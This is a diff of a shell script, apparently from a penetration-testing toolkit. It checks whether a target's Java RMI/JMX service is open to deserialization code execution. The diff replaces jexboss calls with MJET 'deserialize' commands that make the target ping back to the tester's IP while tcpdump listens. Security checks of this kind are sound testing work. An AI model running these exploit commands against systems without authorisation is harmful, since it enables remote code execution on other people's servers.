@@ -17,12 +17,13 @@ print_info() {
 IP=$1
 PORT=$2
 LOCALIP=$3
+PAYLOAD=$4
 
 echo
 echo
 print_title "================================================================="
-print_title "Java-RMI Deserialize in Tomcat JMX (CVE-2016-3427, CVE-2016-8735)" 
-print_title "                 Check with Jexboss                              "
+print_title "          Java-RMI Deserialize in JMX (Anonymous Access)         " 
+print_title "                 Check with MJET                                 "
 print_title "================================================================="
 echo
 
@@ -33,14 +34,12 @@ print_info "Will try to ping local IP = ${LOCALIP} from target"
 print_info "Running tcpdump in background to try to capture ICMP requests if service is vuln..."
 sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
 
-print_info "Running jexboss command for target Linux:"
-print_info "python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --cmd \"/bin/ping -c 4 ${LOCALIP}\""
-python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --cmd "/bin/ping -c 4 ${LOCALIP}" --disable-check-updates > /tmp/jexboss-output.txt
-tail -n +4 /tmp/jexboss-output.txt
-rm /tmp/jexboss-output.txt
-python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --cmd "/usr/bin/ping -c 4 ${LOCALIP}" --disable-check-updates > /tmp/jexboss-output.txt
-tail -n +4 /tmp/jexboss-output.txt
-rm /tmp/jexboss-output.txt
+print_info "Running Mjet command for target Linux:"
+print_info "jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} \"/bin/ping -c 4 ${LOCALIP}\""
+jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} "/bin/ping -c 4 ${LOCALIP}"
+
+print_info "jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} \"/usr/bin/ping -c 4 ${LOCALIP}\""
+jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} "/usr/bin/ping -c 4 ${LOCALIP}"
 
 print_info "Wait a little bit..."
 sleep 3
@@ -61,10 +60,8 @@ print_info "Restart tcpdump"
 sudo sh -c "tcpdump -U -i any -w /tmp/dump.pcap icmp &"
 
 print_info "Running jexboss command for target Windows:"
-print_info "python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --windows --cmd \"ping -n 4 ${LOCALIP}\""
-python2.7 jexboss.py --auto-exploit --jmxtomcat -u ${IP}:${PORT} --windows --cmd "ping -n 4 ${LOCALIP}" --disable-check-updates > /tmp/jexboss-output.txt
-tail -n +4 /tmp/jexboss-output.txt
-rm /tmp/jexboss-output.txt
+print_info "jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} \"ping -n 4 ${LOCALIP}\""
+jython mjet.py ${IP} ${PORT} deserialize ${PAYLOAD} "ping -n 4 ${LOCALIP}"
 
 print_info "Wait a little bit..."
 sleep 3
